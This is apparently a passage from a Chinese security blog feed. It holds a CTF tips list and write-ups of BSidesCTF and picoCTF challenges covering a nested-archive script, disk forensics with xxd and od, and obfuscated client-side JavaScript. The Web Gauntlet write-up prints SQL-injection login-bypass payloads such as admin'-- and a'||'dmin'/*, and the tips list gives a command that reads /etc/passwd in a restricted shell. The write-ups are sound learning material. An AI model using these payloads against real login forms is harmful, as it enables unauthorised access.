href="https://github.com/lukechampine/jsteg">https://github.com/lukechampine/jsteg</a>为 Hackerrank Codefest CTF 2018 提供便利。</p></li><li><p>空白：制表符和空格可以表示 1 和 0 并将它们视为二进制消息……或者，它们可以是空格<a href="http://www.darkside.com.au/snow/"><code>snow</code></a>或深奥的编程语言解释器:<a href="https://tio.run/#whitespace">https://tio.run/#whitespace</a></p><h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2></li><li><p>Keepass：<code>keepassx</code>可以安装在 Ubuntu 上以打开和探索 Keepass 数据库。Keepass 数据库主密码可以用<code>keepass2john</code>.</p></li><li><p>dumpzilla：用于检查配置文件、检查下载、书签、历史记录或书签以及注册密码的Python脚本<code>.mozilla</code>。用法可能是这样的：</p>  <pre class="language-python" data-language="python"><code class="language-python">python dumpzilla<span class="token punctuation">.</span>py <span class="token punctuation">.</span>mozilla<span class="token operator">/</span>firefox<span class="token operator">/</span>c3a958fk<span class="token punctuation">.</span>default<span class="token operator">/</span> <span class="token operator">-</span><span class="token operator">-</span>Downloads <span class="token operator">-</span><span class="token operator">-</span>History <span class="token operator">-</span><span class="token operator">-</span>Bookmarks <span class="token operator">-</span><span class="token operator">-</span>Passwords</code></pre></li><li><p>修复图像在线工具：<a href="https://online.officerecovery.com/cn/pixrecovery/">https://online.officerecovery.com/cn/pixrecovery/</a></p></li><li><p>binwalk/foremost</p></li><li><p>photorec<br>  附带的另一个命令行实用程序<code>testdisk</code>。它是一种文件数据恢复软件，旨在恢复丢失的文件，包括硬盘、CD-ROM 中的视频、文档和档案，以及数码相机内存中丢失的图片（因此称为照片恢复名称）。PhotoRec 会忽略文件系统并跟踪底层数据，因此即使您的媒体文件系统已严重损坏或重新格式化，它仍然可以工作。</p></li><li><p>Forensically 是免费的在线图像分析工具，该工具具有许多功能，例如放大镜、克隆检测、错误级别分析、噪声分析、级别扫描、元数据、地理标记、缩略图分析、JPEG 分析、字符串提取。<a href="https://29a.ch/photo-forensics/#forensic-magnifier">https://29a.ch/photo-forensics/#forensic-magnifier</a></p></li><li><p>volatility: <a href="https://m0re.top/posts/c6e31ef3/">https://m0re.top/posts/c6e31ef3/</a></p></li><li><p>对 DICE 或 EFF 的引用<br>  如果您的挑战引用“EFF”或以某种方式包含骰子，或展示长度为 5 的数字 1-6，请尝试<a href="https://www.eff.org/dice">https://www.eff.org/dice</a>。这可能是指由骰子卷生成的密码短语，此处提供：<a href="https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt">https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt</a></p></li><li><p>shell命令行受限制，可以使用<code>mapfile</code></p>  <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">mapfile</span> -t  <span class="token operator">&lt;</span> /etc/passwd</code></pre></li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>CTFtricks:<a href="https://github.com/JohnHammond/ctf-katana">https://github.com/JohnHammond/ctf-katana</a><br>《CTF特训营》</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSidesCTF&amp;picoCTF复现</title>
      <link href="/posts/2882b189/"/>
      <url>/posts/2882b189/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/030.jpg" loading="lazy"></p><p>真正重要的东西，永远都是非常简单的。</p><a id="more"></a><h1 id="Psst"><a href="#Psst" class="headerlink" title="Psst"></a>Psst</h1><p>究极套娃，没想到国外CTF套娃也这么六。<br>一个<a href="https://storage.googleapis.com/noida_ctf/Misc/psst.tar.gz">压缩包</a>，简直了，每个文件夹下都有一个文件夹和readme_x.txt，在txt中有一个字母，拼起来即为flag。考验脚本能力。<br>Linux中解决此题目，在windows中会因为目录太多解压不出来</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">gzip</span> -d psst.tar.gz<span class="token function">tar</span> -xf psst.tar</code></pre><p>然后就可以使用脚本进行解题了。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> osos<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">"Security"</span><span class="token punctuation">)</span><span class="token comment">#切换至Security目录</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#循环进入目录直到最后一个</span><span class="token comment">#列出所有目录，写入列表中</span>    items <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token comment"># 遍历</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>            next_dir <span class="token operator">=</span> item      <span class="token comment"># 如果是文件夹，将其文件夹的名字重新赋值给next_dir变量储存起来，否则读取文件内容</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token comment"># 如果只有一个文件，那么说明到最后一层了，读取文件后跳出循环</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token comment"># 到下一个文件夹中</span>    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>next_dir<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF/chall<span class="token punctuation">]</span>└─<span class="token comment"># python3 solve.py                              </span>BSNoida<span class="token punctuation">&#123;</span>d1d_y0u_u53_b45h_5cr1pt1ng_6f7220737461636b6f766572666c6f773f<span class="token punctuation">&#125;</span></code></pre><h1 id="Web-Gauntlet"><a href="#Web-Gauntlet" class="headerlink" title="Web Gauntlet"></a>Web Gauntlet</h1><p>经过看了十几分钟英文<code>writeups</code>，菜鸡才明白这个题目是什么逻辑。</p><details>    <summary>描述</summary>    Can you beat the filters? Log in as admin     <br>    http://jupiter.challenges.picoctf.org:29164/     <br>    http://jupiter.challenges.picoctf.org:29164/filter.php</details><details>    <summary>Hints</summary>    不允许您使用有效凭据登录    <br>    如果您的 cookie 不断被重置，请尝试使用私人浏览器窗口    <br>    写下您使用的注射，以防您失去进展。    <br>    对于某些过滤器，可能很难看到字符，请始终（始终）查看响应中的原始十六进制。    <br>    sqlite</details><p>在第一个链接的是登录框，根据提示他是不可能登录成功的，所以这里是注入。<br>第二个链接是<code>filter</code>过滤器，里面显示每一关的过滤内容。</p><div class="danger"><blockquote><p>Round_one</p></blockquote></div><p>SQL语句在第一关输入内容即可看见</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> username<span class="token operator">=</span><span class="token single-quoted-string string">'admin'</span> <span class="token keyword">AND</span> password<span class="token operator">=</span><span class="token single-quoted-string string">'pass'</span></code></pre><p>第一关只过滤了or    所以可以使用万能密码进行尝试绕过。</p><pre class="language-php" data-language="php"><code class="language-php">user<span class="token punctuation">:</span>admin<span class="token single-quoted-string string">'--pass:随意满足select * from users where username='</span>admin<span class="token single-quoted-string string">'--'</span> <span class="token keyword">and</span> password<span class="token operator">=</span><span class="token single-quoted-string string">'pass'</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210809155502330.png" alt="image-20210809155502330" loading="lazy"></p><div class="info"><blockquote><p>Round_two</p></blockquote></div><p>第二关过滤器中显示<code>Round2: or and like = --</code><br>测试发现<code>#</code>也失效了，还有过滤符<code>/*</code>，所以尝试<code>admin&#39;/*</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210809160103530.png" alt="image-20210809160103530" loading="lazy"></p><div class="warning"><blockquote><p>Round_three</p></blockquote></div><p>第三关过滤器显示：<code>Round3: or and = like &gt; &lt; --</code><br>仍然可以用上一关的注释<code>/*</code></p><div class="success"><blockquote><p>Round_four</p></blockquote></div><p>过滤器：<code>Round4: or and = like &gt; &lt; -- admin</code><br>使用连接符<code>||</code>，构造payload: <code>a&#39;||&#39;dmin&#39;/*</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> username<span class="token operator">=</span><span class="token single-quoted-string string">'a'</span><span class="token operator">||</span><span class="token single-quoted-string string">'dmin'</span><span class="token operator">/</span><span class="token operator">*</span><span class="token single-quoted-string string">' AND password='</span>pass'</code></pre><blockquote><p>Round_five</p></blockquote><p>过滤器：<code>Round5: or and = like &gt; &lt; -- union admin</code><br>沿用上一关的payload即可</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210809160940183.png" alt="image-20210809160940183" loading="lazy">再看过滤器</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"round"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"round"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$round</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"round"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$view</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"PHP_SELF"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"/filter.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"or"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Round1: "</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"or"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"and"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"like"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"="</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"--"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Round2: "</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"or"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"and"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"="</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"like"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">">"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&lt;"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"--"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Round3: "</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"or"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"and"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"="</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"like"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">">"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&lt;"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"--"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Round4: "</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"or"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"and"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"="</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"like"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">">"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&lt;"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"--"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"union"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Round5: "</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">" "</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">>=</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"filter.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"round"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// picoCTF&#123;y0u_m4d3_1t_a3ed4355668e74af0ecbb7496c8dd7c5&#125;</span><span class="token delimiter important">?></span></span></code></pre><h1 id="Pitter-Patter-Platters"><a href="#Pitter-Patter-Platters" class="headerlink" title="Pitter, Patter, Platters"></a>Pitter, Patter, Platters</h1><p>一个取证类题目，越做越菜。<br>我的思路：strings一下，看看有哪些明显的字符串，发现了一段<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210809184621106.png" alt="image-20210809184621106" loading="lazy"></p><p>然后使用010editor打开，寻找此部分，直接在数据中找到flag<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210809184707722.png" alt="image-20210809184707722" loading="lazy"></p><p>可以看出flag是逆序的，将其翻转过来即可。<br>大佬思路：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>_<span class="token operator">&lt;</span><span class="token comment"># file suspicious.dd.sda1</span>suspicious.dd.sda1: Linux <span class="token function">rev</span> <span class="token number">1.0</span> ext3 filesystem data, <span class="token assign-left variable">UUID</span><span class="token operator">=</span>fc168af0-183b-4e53-bdf3-9c1055413b40 <span class="token punctuation">(</span>needs journal recovery<span class="token punctuation">)</span><span class="token operator">></span>_<span class="token operator">&lt;</span><span class="token comment"># fls suspicious.dd.sda1</span>d/d <span class="token number">11</span>: lost+foundd/d <span class="token number">2009</span>:       bootd/d <span class="token number">4017</span>:       tcer/r <span class="token number">12</span>: suspicious-file.txtV/V <span class="token number">8033</span>:       <span class="token variable">$OrphanFiles</span><span class="token operator">></span>_<span class="token operator">&lt;</span><span class="token comment"># icat suspicious.dd.sda1 12</span>Nothing to see here<span class="token operator">!</span> But you may want to <span class="token function">look</span> here --<span class="token operator">></span><span class="token operator">></span>_<span class="token operator">&lt;</span><span class="token comment"># strings -a -t x suspicious.dd.sda1 | grep "Nothing to see here! But you may want to look here"</span>┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># xxd -s 0x200400 -l 200 suspicious.dd.sda1</span>00200400: 4e6f <span class="token number">7468</span> 696e <span class="token number">6720</span> 746f <span class="token number">2073</span> <span class="token number">6565</span> <span class="token number">2068</span>  Nothing to see h00200410: <span class="token number">6572</span> <span class="token number">6521</span> <span class="token number">2042</span> <span class="token number">7574</span> <span class="token number">2079</span> 6f75 206d <span class="token number">6179</span>  ere<span class="token operator">!</span> But you may00200420: <span class="token number">2077</span> 616e <span class="token number">7420</span> 746f 206c 6f6f 6b20 <span class="token number">6865</span>   want to <span class="token function">look</span> he00200430: <span class="token number">7265</span> 202d 2d3e 0a7d 0036 0062 0037 0064  re --<span class="token operator">></span>.<span class="token punctuation">&#125;</span>.6.b.7.d00200440: 0035 0034 0039 0062 005f 0033 003c 005f  .5.4.9.b._.3.<span class="token operator">&lt;</span>._00200450: 007c 004c 006d 005f 0031 0031 0031 0074  <span class="token builtin class-name">.</span><span class="token operator">|</span>.L.m._.1.1.1.t00200460: 0035 005f 0033 0062 007b 0046 0054 0043  .5._.3.b.<span class="token punctuation">&#123;</span>.F.T.C00200470: 006f 0063 0069 0070 0000 0000 0000 0000  .o.c.i.p<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>00200480: 0000 0000 0000 0000 0000 0000 0000 0000  <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>00200490: 0000 0000 0000 0000 0000 0000 0000 0000  <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>002004a0: 0000 0000 0000 0000 0000 0000 0000 0000  <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>002004b0: 0000 0000 0000 0000 0000 0000 0000 0000  <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>002004c0: 0000 0000 0000 0000                      <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre><p>可以进行手动逆序。命令也行，命令如下：</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># od --skip-bytes=0x200437 --read-bytes=66 suspicious.dd.sda1 --format=c --address-radix=n --width=100 | sed "s/\\\0//g" | tr -d " " | rev</span>picoCTF<span class="token punctuation">&#123;</span>b3_5t111_mL<span class="token operator">|</span>_<span class="token operator">&lt;</span>3_b945d7b6<span class="token punctuation">&#125;</span></code></pre><p>或者使用python的方法</p><pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">"print(''.join(reversed('&#125;.8.3.4.6.0.c.a.e._.3.&lt;._.|.L.m._.1.1.1.t.5._.3.b.&#123;.F.T.C.o.c.i.p'.split('.'))))"</span> picoCTF<span class="token punctuation">&#123;</span>b3_5t111_mL<span class="token operator">|</span>_<span class="token operator">&lt;</span>3_b945d7b6<span class="token punctuation">&#125;</span></code></pre><h1 id="Client-side-again"><a href="#Client-side-again" class="headerlink" title="Client-side-again"></a>Client-side-again</h1><blockquote><p>Can you break into this super secure portal?</p></blockquote><p>思路：在源代码中没有找到任何的关于post提交什么东西的内容，比如：<code>index.php</code>或者<code>login.php</code>等等具有标志性的代码，只看到了js代码。这种题目往往是无需在登录处浪费时间的。</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> _0x5a46<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'f49bf&#125;'</span><span class="token punctuation">,</span><span class="token string">'_again_e'</span><span class="token punctuation">,</span><span class="token string">'this'</span><span class="token punctuation">,</span><span class="token string">'Password\x20Verified'</span><span class="token punctuation">,</span><span class="token string">'Incorrect\x20password'</span><span class="token punctuation">,</span><span class="token string">'getElementById'</span><span class="token punctuation">,</span><span class="token string">'value'</span><span class="token punctuation">,</span><span class="token string">'substring'</span><span class="token punctuation">,</span><span class="token string">'picoCTF&#123;'</span><span class="token punctuation">,</span><span class="token string">'not_this'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x4bd822<span class="token punctuation">,</span>_0x2bd6f7</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> <span class="token function-variable function">_0xb4bdb3</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x1d68f6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">--</span>_0x1d68f6<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_0x4bd822<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x4bd822<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">_0xb4bdb3</span><span class="token punctuation">(</span><span class="token operator">++</span>_0x2bd6f7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span>_0x5a46<span class="token punctuation">,</span><span class="token number">0x1b3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token function-variable function">_0x4b5b</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x2d8f05<span class="token punctuation">,</span>_0x4b81bb</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_0x2d8f05<span class="token operator">=</span>_0x2d8f05<span class="token operator">-</span><span class="token number">0x0</span><span class="token punctuation">;</span><span class="token keyword">var</span> _0x4d74cb<span class="token operator">=</span>_0x5a46<span class="token punctuation">[</span>_0x2d8f05<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> _0x4d74cb<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>checkpass<span class="token operator">=</span>document<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x0'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'pass'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x1'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>split<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span>split<span class="token operator">*</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span><span class="token number">0x9</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'&#123;n'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token 